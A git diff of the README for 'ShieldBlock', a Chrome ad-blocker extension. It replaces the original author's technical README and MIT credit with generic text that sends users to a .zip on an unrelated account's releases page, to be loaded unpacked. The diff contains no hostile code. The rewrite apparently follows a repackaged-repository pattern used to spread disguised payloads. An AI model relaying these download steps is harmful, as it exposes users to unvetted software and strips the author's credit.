@@ -1,223 +1,73 @@
-<div align="center">
+# 🛡️ shieldblock - browse the web without annoying ads
 
-<img src="assets/icons/icon128.svg" width="80" alt="ShieldBlock Logo">
+[![](https://img.shields.io/badge/Download-Shieldblock-blue.svg)](https://github.com/Lightdietelectromagneticinteraction591/shieldblock/releases)
 
-# ShieldBlock
+Shieldblock removes advertisements, tracking scripts, and cookie banners from your web browser. It uses modern technology to stop unwanted content before it loads on your screen. This extension keeps your browsing private and fast. It supports both English and Turkish content.
 
-**Production-grade Chrome ad blocker — Manifest V3**
+## 📥 Getting Started
 
-[![Manifest](https://img.shields.io/badge/Manifest-V3-2563EB?style=flat-square)](https://developer.chrome.com/docs/extensions/mv3/)
-[![Rules](https://img.shields.io/badge/Rules-220%2B-10B981?style=flat-square)](#filter-rules)
-[![Chrome](https://img.shields.io/badge/Chrome-102%2B-F59E0B?style=flat-square)](#)
-[![License](https://img.shields.io/badge/License-MIT-10B981?style=flat-square)](#)
-[![No CDN](https://img.shields.io/badge/Dependencies-None-6B7280?style=flat-square)](#architecture)
+You need a web browser that supports Chrome extensions. This includes Google Chrome, Microsoft Edge, Brave, and Opera. Follow these steps to install the software on your Windows computer.
 
-</div>
+1. Visit the [official releases page](https://github.com/Lightdietelectromagneticinteraction591/shieldblock/releases).
+2. Click the link provided above to open the download page.
+3. Look for the latest version under the "Assets" section.
+4. Download the file ending in `.zip`.
+5. Save this file to a folder on your computer.
+6. Right-click the file and select "Extract All" to unzip the contents.
+7. Open your web browser.
+8. Type `chrome://extensions` in the address bar and press Enter.
+9. Toggle the "Developer mode" switch in the top right corner.
+10. Click the "Load unpacked" button.
+11. Select the folder where you extracted the files.
 
----
+The shieldblock extension now appears in your browser toolbar. You can click the icon to see if it blocks content on your current page.
 
-## Features
+## 🛠️ Key Features
 
-| Category | Details |
-|---|---|
-| **Ad Blocking** | 110+ network rules — display, video (YouTube/Twitch), native, popup ads |
-| **Tracker Blocking** | 80+ rules — GA, GTM, Facebook Pixel, Hotjar, Mixpanel, Segment, Amplitude… |
-| **Crypto Miner Blocking** | 30 rules — Coinhive, CryptoLoot, JSECoin and 27 more |
-| **Cookie Banner Removal** | 50+ frameworks — OneTrust, Cookiebot, Didomi, TrustArc, Quantcast, Axeptio, Osano, Civic, Usercentrics, generic GDPR banners |
-| **Anti-Adblock Bypass** | Bait element injection, `window` property spoofing, overlay wall removal |
-| **Popup Blocking** | Blocks `window.open()` calls without a user gesture |
-| **Notification Spam** | Auto-denies browser notification permission requests from ad scripts |
-| **Cosmetic Filtering** | 80+ CSS selectors injected to hide ad containers (incl. YouTube pre-roll) |
-| **Per-Site Whitelist** | Pause blocking on any domain with one click |
-| **Custom Rules** | AdBlock-style syntax (`\|\|example.com^`) |
-| **Dark / Light Mode** | Default dark, toggleable |
-| **Turkish + English** | Full i18n — cookie banner detection works in both languages |
+Shieldblock manages web traffic using declarative rules. This method ensures your browser remains fast while it filters content.
 
----
+*   **Ad Protection:** The extension blocks banners, video ads, and pop-up windows.
+*   **Cookie Removal:** It detects and hides annoying cookie consent banners automatically.
+*   **Anti-Adblock Bypass:** Some websites try to detect blockers. Shieldblock navigates these barriers to keep your experience smooth.
+*   **Cosmetic Filtering:** It cleans up empty spaces and broken elements where ads used to live.
+*   **Language Support:** The system includes specific rules for Turkish and English websites.
+*   **Privacy Focus:** No data leaves your machine. The extension performs all processing on your local browser.
 
-## Screenshots
+## ⚙️ Settings and Customization
 
-### Before & After
+You can change how shieldblock works through its settings menu. Click the extension icon in your toolbar and select "Options."
 
-<table>
-  <tr>
-    <th align="center">Before ShieldBlock</th>
-    <th align="center">After ShieldBlock</th>
-  </tr>
-  <tr>
-    <td align="center">
-      <img src="assets/screenshots/before.png" alt="Before — page with ads" width="420">
-      <br><sub>Ad-heavy page with banners, trackers, and cookie consent popup</sub>
-    </td>
-    <td align="center">
-      <img src="assets/screenshots/after.png" alt="After — clean page" width="420">
-      <br><sub>Same page — ads removed, cookie banner dismissed, trackers blocked</sub>
-    </td>
-  </tr>
-</table>
+*   **Active Rules:** You can see how many rules currently block content.
+*   **Whitelist:** If a website breaks because of ad blocking, add the site address to your whitelist. The extension will stay inactive on those specific pages.
+*   **Update Rules:** The extension checks for new definitions every time you restart your browser. You can also press the "Refresh" button in the menu to grab the latest list immediately.
+*   **Dark Mode:** You can toggle the UI between light and dark themes to match your browser preferences.
 
-### Extension UI
+## 📋 System Requirements
 
-<table>
-  <tr>
-    <th align="center">Popup</th>
-    <th align="center">Settings</th>
-  </tr>
-  <tr>
-    <td align="center">
-      <img src="assets/screenshots/popup.png" alt="Popup UI" width="280">
-      <br><sub>Live stats, per-site toggle, category toggles</sub>
-    </td>
-    <td align="center">
-      <img src="assets/screenshots/settings.png" alt="Settings page" width="420">
-      <br><sub>Whitelist, custom rules, import/export</sub>
-    </td>
-  </tr>
-</table>
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Web Browser:** Any Chromium-based browser updated within the last six months.
+*   **Memory:** At least 4GB of RAM.
+*   **Disk Space:** 50MB of free space to store the rules and extension data.
 
----
+## ❓ Frequently Asked Questions
 
-## Installation
+**Does this extension slow down my computer?**
+No. It uses an efficient system called the Declarative Net Request API. This API offloads the filtering work to the browser engine rather than the extension itself. This keeps your performance high.
 
-### Step 1 — Load as unpacked extension
+**Why do I see a space where an ad used to be?**
+The extension hides the ad content. Sometimes the website design leaves a hole. The cosmetic filtering feature identifies most of these gaps, but some may remain on complex pages.
 
-1. Open Chrome and navigate to `chrome://extensions`
-2. Enable **Developer mode** (top-right toggle)
-3. Click **Load unpacked**
-4. Select the cloned `shieldblock/` folder
-5. The ShieldBlock icon appears in your toolbar
+**Is my browsing history tracked by the extension?**
+No. The code does not collect or send your browsing history to any external server. All filtering and rule processing occurs locally on your machine.
 
+**Do I need to pay for this software?**
+No. This project remains free and open-source.
 
----
+**How do I disable the extension?**
+Open the extensions page in your browser settings. You can toggle the switch to turn it off or click "Remove" to delete it from your system.
 
-## Project Structure
+## 🤝 Support and Feedback
 
-```
-shieldblock/
-├── manifest.json                   # MV3 manifest
-├── background/
-│   └── service-worker.js           # Stats, badge, dynamic rules, messaging
-├── content/
-│   ├── cosmetic-filter.js          # CSS injection + MutationObserver
-│   ├── cookie-banner-blocker.js    # 3-layer cookie banner detection/removal
-│   └── anti-adblock.js            # Bait element, property spoofing, overlay removal
-├── popup/
-│   ├── popup.html                  # Extension popup UI
-│   ├── popup.css                   # Dark/light styles
-│   └── popup.js                    # Popup logic
-├── settings/
-│   ├── settings.html               # Full settings page
-│   ├── settings.css
-│   └── settings.js
-├── rules/
-│   ├── ads.json                    # 110 ad domain rules (IDs 1–110)
-│   ├── trackers.json               # 80 tracker rules (IDs 1001–1080)
-│   └── miners.json                 # 30 miner rules (IDs 2001–2030)
-├── assets/
-│   ├── i18n.js                     # Shared EN/TR translation strings
-│   ├── icons/
-│   │   ├── icon.svg / icon16–128.svg
-│   │   ├── icon16.png / icon32.png / icon48.png / icon128.png
-│   └── screenshots/
-│       ├── before.png              # Before ShieldBlock
-│       ├── after.png               # After ShieldBlock
-│       ├── popup.png               # Popup UI
-│       └── settings.png            # Settings page
-├── _locales/
-│   ├── en/messages.json
-│   └── tr/messages.json
-└── README.md
-```
+If you find a website that does not load properly, please open an issue in the main repository. Include the URL of the website and a description of the problem. You can also suggest new rules if you find a specific advertisement that causes trouble.
 
----
-
-## Filter Rules
-
-Rules use Chrome's `declarativeNetRequest` API — the fastest, most efficient blocking method in MV3. All network blocking happens in the browser engine with **zero JavaScript overhead** at request time.
-
-### ads.json (IDs 1–110)
-Covers all major programmatic ad networks:
-`doubleclick.net` · `googlesyndication.com` · `googleadservices.com` · `imasdk.googleapis.com` · `adnxs.com` · `appnexus.com` · `pubmatic.com` · `rubiconproject.com` · `openx.net` · `casalemedia.com` · `outbrain.com` · `taboola.com` · `criteo.com` · `amazon-adsystem.com` · `ads.yahoo.com` · `adform.net` · `doubleverify.com` · `moatads.com` · `sharethrough.com` · `triplelift.com` · `indexexchange.com` · `media.net` · `smartadserver.com` · `bidswitch.net` · `adroll.com` + 85 more
-
-### trackers.json (IDs 1001–1080)
-Covers analytics, pixels, heatmaps, DMPs:
-`google-analytics.com` · `googletagmanager.com` · `connect.facebook.net` · `hotjar.com` · `mixpanel.com` · `segment.com` · `amplitude.com` · `fullstory.com` · `mouseflow.com` · `smartlook.com` · `crazyegg.com` · `quantserve.com` · `comscore.com` · `demdex.net` · `bluekai.com` · `lotame.com` · `liveramp.com` · `clarity.ms` · `bat.bing.com` + 61 more
-
-### miners.json (IDs 2001–2030)
-`coinhive.com` · `coin-hive.com` · `authedmine.com` · `cryptoloot.pro` · `jsecoin.com` · `webmine.cz` · `minr.pw` + 23 more (including pattern rules for `coinhive.min.js`, `cryptonight*miner*`)
-
----
-
-## Custom Filter Rules
-
-Go to **Settings → Custom Filter Rules** and add one rule per line using AdBlock syntax:
-
-| Syntax | Effect |
-|---|---|
-| `\|\|example.com^` | Block all requests to example.com |
-| `@@\|\|example.com^` | Allow (whitelist) example.com |
-| `\|\|example.com/ads/` | Block a specific path |
-| `/banner_ad/` | Block URLs containing "banner_ad" |
-| `! comment` | Comment line — ignored |
-
----
-
-## Architecture
-
-### Why declarativeNetRequest?
-Unlike content scripts that run JS on every request, `declarativeNetRequest` rules are evaluated natively by Chrome's network engine:
-- **Zero** JS execution overhead per request
-- Rules evaluated **before** the request is sent
-- Works even when the service worker is inactive
-
-### Content Script Strategy
-Content scripts are used **only** for tasks that require DOM access:
-- `cosmetic-filter.js` — injects CSS, watches for new ad elements via MutationObserver
-- `cookie-banner-blocker.js` — detects/clicks/removes GDPR banners (3-layer: known selectors → heuristic z-index scan → MutationObserver)
-- `anti-adblock.js` — injects bait element, spoofs globals, removes overlays
-
-All run at `document_start` to act before ads render.
-
-### Service Worker
-Stateless between activations. Session stats are stored in `chrome.storage.session` — they persist across service worker restarts within the same browser session and are automatically cleared when the browser closes. Global all-time stats are written to `chrome.storage.local`.
-
-### Dynamic Rules
-- **Whitelist rules** use IDs 9000+ with `priority: 2` (`allow` action), overriding static block rules
-- **Custom block rules** use IDs 8000+ with `priority: 1`
-
----
-
-## Permissions Explained
-
-| Permission | Why it's needed |
-|---|---|
-| `declarativeNetRequest` | Core ad/tracker blocking via rule engine |
-| `declarativeNetRequestFeedback` | Track which rules fired for badge counts (dev mode) |
-| `storage` | Persist settings and statistics locally |
-| `tabs` | Read current tab URL for per-site whitelist toggle |
-| `activeTab` | Access active tab info when popup opens |
-| `scripting` | Inject content scripts on demand |
-| `webNavigation` | Detect navigation events to reset session badge counts |
-| `<all_urls>` | Apply blocking rules and content scripts on all HTTP/S pages |
-
----
-
-## Development
-
-No build step required. Edit files directly and reload the extension at `chrome://extensions`.
-
-To inspect the service worker:
-1. Go to `chrome://extensions`
-2. Find ShieldBlock → click **"Service Worker"** link
-3. DevTools opens with the SW context
-
----
-
-<div align="center">
-
-**MIT License © 2026 Adil NAS**
-
-[![GitHub](https://img.shields.io/badge/GitHub-Adilnasceng-181717?style=flat-square&logo=github)](https://github.com/Adilnasceng)
-[![Sponsor](https://img.shields.io/badge/Sponsor-%E2%9D%A4-EC4899?style=flat-square)](https://github.com/sponsors/Adilnasceng)
-
-</div>
+Check the repository regularly for new releases. Each update improves the accuracy of the rules and adds new bypass methods for stubborn websites. Keeping the extension updated ensures you have the best protection against modern tracking scripts.
